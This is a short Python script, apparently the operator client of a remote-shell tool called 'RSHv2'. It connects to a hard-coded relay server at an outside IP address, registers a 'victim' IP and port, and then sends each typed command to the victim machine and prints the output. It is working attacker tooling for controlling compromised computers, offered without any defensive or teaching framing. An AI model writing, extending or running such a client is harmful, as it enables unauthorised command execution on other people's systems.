from socket import socket, SOCK_STREAM, AF_INET
from os import system, name as osname

NAME = 'RSHv2'
VERSION = '1.0.0'
AUTHOR = 'Lactua'
SOURCE_CODE = 'https://github.com/lactua/rshv2'
SERVER_HOST = ('45.158.77.206', 5001)

is_windows = osname == 'nt'

def clear(): system('cls' if is_windows else 'clear')
def setWindowTitle(title):
    if is_windows:
        system(f'title {title}')

setWindowTitle(f'{NAME} - {VERSION}') 

victim_ip = input('IP Adress > ')
victime_port = input('Port > ')

victim_addr = f"{victim_ip}:{victime_port}"

client = socket(AF_INET, SOCK_STREAM)
client.connect(SERVER_HOST)

client.send(victim_addr.encode())
status = client.recv(1024).decode()

if status == '1':
    print("Connection allowed")
    input("Press enter to continue...")
else:
    print("Connection failed")
    input("Press enter to exit...")
    exit()

clear()

setWindowTitle(f'{NAME} - {VERSION} / Connected to {victim_addr}')
print(f"{NAME} {VERSION} Initialized | By {AUTHOR}\nSOURCE CODE : {SOURCE_CODE}\n")

while True:
    try:
        cmd = input('>>> ')
        if cmd:
            client.send(cmd.encode())
            output = client.recv(1024).decode('ascii', errors='replace')
            if output != '0': print(output)
    except Exception as error:
        print("Connection stopped." + str(error))
        input("Press enter to exit...")
        exit()